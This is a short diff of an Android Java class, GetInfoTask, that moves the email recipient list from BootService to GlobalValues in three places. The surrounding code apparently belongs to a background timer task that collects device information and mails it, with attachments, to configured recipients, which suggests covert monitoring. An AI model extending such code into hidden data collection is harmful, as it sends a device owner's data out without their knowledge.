@@ -91,7 +91,7 @@ public class GetInfoTask extends TimerTask
 		*/
 		
 		// If there are no recipients, return 
-		if (BootService.recipients == null || BootService.recipients.length == 0) return;
+		if (GlobalValues.recipients == null || GlobalValues.recipients.length == 0) return;
 		
 		// Get initial networks state
 		boolean isAlreadyWifiConnected = NetworkUtil.isWifiConnected(context);
@@ -157,7 +157,7 @@ public class GetInfoTask extends TimerTask
 					{
 						String host = MailCfg.getHost(context);
 						String sender = MailCfg.getSender(context);
-						result = sendMail(subject, body, host, sender, pwd, BootService.recipients, attachments);
+						result = sendMail(subject, body, host, sender, pwd, GlobalValues.recipients, attachments);
 						retry--;
 					}
 					attachments.clear();
@@ -250,7 +250,7 @@ public class GetInfoTask extends TimerTask
 					{
 						String host = MailCfg.getHost(context);
 						String sender = MailCfg.getSender(context);
-						result = sendMail(subject, body, host, sender, pwd, BootService.recipients, pack);
+						result = sendMail(subject, body, host, sender, pwd, GlobalValues.recipients, pack);
 						retry--;
 					}
 		
